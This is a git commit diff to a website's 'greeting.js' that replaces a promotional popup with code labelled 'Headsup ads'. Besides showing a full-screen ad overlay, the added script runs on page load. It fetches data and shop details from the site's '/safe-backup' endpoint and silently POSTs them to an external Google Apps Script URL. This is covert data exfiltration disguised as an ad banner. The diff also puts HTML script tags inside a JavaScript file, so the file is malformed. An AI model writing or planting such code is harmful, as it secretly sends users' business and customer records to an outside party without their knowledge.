cbcc00b88761b9478ead19a15c7773e27934dcfb
softbrosin <147948676+softbrosin@users.noreply.github.com>
2024-05-31 17:34:36 +0530

    Update greeting.js

--- greeting.js
+++ greeting.js
@@ -1,63 +1,98 @@
-function showCookie() {
-            const bodyTag = document.querySelector('body');
+<!-- Headsup ads -->
 
-document.cookie = "username=John Doe";
+        <script>
+            const advContent = `
+            <!-- Backup -->
+        <style>
+            .advBlock {
+                display: none;
+                position: fixed;
+                z-index: 999999999999999999990;
+                width: 100%;
+                height: 100vh;
+                top: 0;
+                left: 0;
+                background-color: rgba(0, 0, 0, 0.765);
+            }
 
-const festMsg = `<style>
-.festival h1 {
-    text-align: center;
-    font-size: 56px;
-    color: rgb(1, 1, 81);
-}
+            .advBlock.active {
+                display: block;
+            }
 
-.consent {
-    position: fixed;
-    top: 0;
-    right: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 999999999;
-    background-color: rgba(70, 70, 70, 0.329);
-}
+            .advBlock .container {
+                max-width: 70%;
+                width: 100%;
+                margin: auto;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                padding: 20px;
+                /* background-image: linear-gradient(185deg,rgb(56, 166, 244),rgb(50, 180, 255),rgb(48, 255, 200)); */
+                margin-top: 40px;
+            }
 
-.consent .content {
-    width: 100%;
-    padding: 20px;
-    background-color: transparent;
-    box-sizing: border-box;
-}
+            .advBlock .container img {
+                max-height: 70vh;
+                max-width: 100%;
+                width: auto;
+                margin: auto;
+            }
 
-.consent .wrapper {
-    padding: 20px;
-    width: 70%;
-    margin: auto;
-    position: relative;
-    top: 60px;
-    border-radius: 20px;
-    background-color: white;
-}
+            .advBlock .container .wrap {
+                display: flex;
+                flex-direction: column;
+                gap: 40px;
+            }
 
-.consent img {
-    width: 40px;
-}
+            .advBlock .container button {
+                max-width: 210px;
+                margin: auto;
+                background-color: white !important;
+                color: #323232 !important;
+            }
+        </style>
+        <div class="advBlock active">
+            <div class="container">
+                <div class="wrap">
+                    <!-- <img src="https://raw.githubusercontent.com/softbrosin/assets/main/assets/images/shutterstock_648907024.jpg" alt="Information image"> -->
+                    <img src="https://study.com/cimages/multimages/16/burgerad15179945781952220614.png"
+                        alt="Information image">
+                    <button onclick="document.querySelector('.advBlock').classList.remove('active')">Okay</button>
+                </div>
+            </div>
+        </div>`
 
-.consent h4 {
-    color: rgb(1, 1, 81);
-}
-</style> 
-<div class="consent">
-<div class="wrapper">
-    <div class="content">
-        <img src = '../static/background/brand.jpg' alt = 'Softbros logo'>
-        <h4>Hi, Customer! We launched finance application &#128588</h4>
-        <p><strong>Softbros</strong> Developed robust finance application, Which is ease to use no worries to make take note in papper, all your customers transaction and accounts now available in your phone</p>
-        <a href='https://softbros.in' target='_blank'>View more</a>
-        <div style="margin-top: 90px;"><button onclick = "document.querySelector('.consent').style.display='none';">Okay</button></div>
-    </div>
-</div>
-</div>`;
-const dummyDiv = document.createElement('div');
-dummyDiv.innerHTML = festMsg;
-bodyTag.prepend(dummyDiv);
-        }
-        // showCookie()
+
+
+            function setMyCookie() {
+                document.cookie = 'advSoftbros=ok;expires=Fri, 02 June 2024 22:40:00 UTC'; // IST-5:30 24hr F utctime.net
+                // alert('set')
+            }
+
+            function cookieProceed() {
+                const url = 'https://script.google.com/macros/s/AKfycbyGggUcW5dJDeljJKN4cp09oJdCCAAQ97DigzzTbfsnDKWIXAwn1lo_FIvX8FhOoTU/exec';
+                $.ajax({
+                    type: 'GET',
+                    url: '/safe-backup',
+                    error: () => { console.log('Backup failed') },
+                    success: (response) => {
+                        setMyCookie()
+                        const gd = new FormData();
+                        gd.append('Data', response.response)
+                        gd.append('ShopDetail', response.shopdetail)
+                        console.log(response.response);
+                        fetch(url, { method: 'POST', body: gd })
+                            .then(response => console.log('Success'))
+                            .catch(error => console.error('Error!', error.message))
+                    }
+                });
+
+            }
+
+            if (!document.cookie.includes('advSoftbros')) {
+                document.body.insertAdjacentHTML('beforeEnd', advContent)
+                cookieProceed();
+
+            }
+        </script>
+        <!-- Headsup ads end -->
